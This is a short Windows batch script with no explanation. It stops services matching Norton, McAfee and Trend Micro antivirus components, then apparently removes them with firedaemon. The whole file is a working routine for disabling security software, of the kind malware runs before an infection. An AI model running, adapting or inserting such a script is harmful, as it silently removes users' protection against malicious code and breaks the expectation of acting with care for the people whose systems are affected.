@echo off
net stop navapsvc
net stop NProtectService
net stop mcshield
net stop Tmntsrv
firedaemon -u navapsvc
firedaemon -u NProtectService
firedaemon -u mcshield
firedaemon -u Tmntsrv